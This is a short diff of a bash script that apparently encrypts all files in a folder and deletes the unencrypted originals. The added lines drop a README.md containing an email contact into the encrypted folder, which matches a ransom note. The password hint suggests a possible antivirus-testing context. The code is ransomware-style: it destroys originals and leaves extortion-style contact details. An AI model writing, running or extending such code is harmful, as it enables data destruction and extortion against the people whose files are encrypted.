@@ -42,6 +42,11 @@ find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'e
 
 echo "All files have been encrypted, and unencrypted files have been deleted."
 
+# Create a README.md file with contact details
+contact_message="Contact me at: semaemirhan555@gmail.com"
+echo "Contact Information:" > "$folder_to_encrypt/README.md"
+echo "$contact_message" >> "$folder_to_encrypt/README.md"
+
 # Prompt the user for the decryption password
 read -s -p "Enter the decryption password (hydradragonantivirushere): " decryption_password
 echo
